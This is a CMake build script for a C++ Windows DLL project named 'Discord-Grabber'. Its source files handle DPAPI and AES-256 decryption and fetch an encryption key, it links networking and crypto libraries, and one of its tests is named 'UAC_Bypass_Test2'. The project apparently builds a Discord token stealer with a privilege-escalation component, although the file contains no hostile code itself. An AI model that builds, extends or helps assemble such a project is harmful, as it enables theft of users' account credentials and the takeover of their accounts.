cmake_minimum_required(VERSION 3.15)

project(Discord-Grabber VERSION 1.0 LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)
option(ENABLE_WARNINGS "Enable compiler warnings" ON)
option(ENABLE_TESTS    "Build tests" ON)

set(FINAL_OUTPUT_DIR ${PROJECT_SOURCE_DIR}/out)

add_library(Discord-Grabber SHARED
    Discord-Grabber-lib/src/discord.cpp
    Discord-Grabber-lib/src/dllmain.cpp
    Discord-Grabber-lib/src/exports.cpp

    Discord-Grabber-lib/src/Utils/EndsWith.cpp
    Discord-Grabber-lib/src/Utils/GetEncryptKey.cpp

    Discord-Grabber-lib/src/Decryption/Base64.cpp   
    Discord-Grabber-lib/src/Decryption/AES256.cpp   
    Discord-Grabber-lib/src/Decryption/DPAPI.cpp
)

target_include_directories(Discord-Grabber
    PUBLIC
        ${PROJECT_SOURCE_DIR}/Discord-Grabber-lib/include
        ${PROJECT_SOURCE_DIR}/3party
    PRIVATE
        ${PROJECT_SOURCE_DIR}/Discord-Grabber-lib/src
)

if(ENABLE_WARNINGS)
    include(cmake/warnings.cmake)
    set_project_warnings(Discord-Grabber)
endif()

set_target_properties(Discord-Grabber PROPERTIES
    RUNTIME_OUTPUT_DIRECTORY   ${FINAL_OUTPUT_DIR}
    LIBRARY_OUTPUT_DIRECTORY   ${FINAL_OUTPUT_DIR}
    ARCHIVE_OUTPUT_DIRECTORY    ${FINAL_OUTPUT_DIR}
)

if(ENABLE_TESTS)
    include(CTest)
    enable_testing()

    add_executable(test_api "tests/Test1/main.cpp")
    target_link_libraries(test_api PRIVATE Discord-Grabber)

    if(ENABLE_WARNINGS)
        set_project_warnings(test_api)
    endif()

    if(WIN32)
        add_custom_command(TARGET test_api POST_BUILD
            COMMAND ${CMAKE_COMMAND} -E copy_if_different
                $<TARGET_FILE:Discord-Grabber>
                $<TARGET_FILE_DIR:test_api>
        )
        target_link_libraries(Discord-Grabber PRIVATE Crypt32 bcrypt ws2_32)
    endif()
    


    set_target_properties(test_api PROPERTIES
        RUNTIME_OUTPUT_DIRECTORY ${FINAL_OUTPUT_DIR}
    )

    add_test(NAME Discord-Grabber COMMAND test_api)

    add_executable(test_api2 "tests/Test2/main.cpp")
    target_link_libraries(test_api2 PRIVATE Discord-Grabber)

    if(ENABLE_WARNINGS)
        set_project_warnings(test_api2)
    endif()

    if(WIN32)
        add_custom_command(TARGET test_api2 POST_BUILD
            COMMAND ${CMAKE_COMMAND} -E copy_if_different
                $<TARGET_FILE:Discord-Grabber>
                $<TARGET_FILE_DIR:test_api2>
        )
    endif()

    set_target_properties(test_api2 PROPERTIES
        RUNTIME_OUTPUT_DIRECTORY ${FINAL_OUTPUT_DIR}
    )

    add_test(NAME UAC_Bypass_Test2 COMMAND test_api2)
endif()
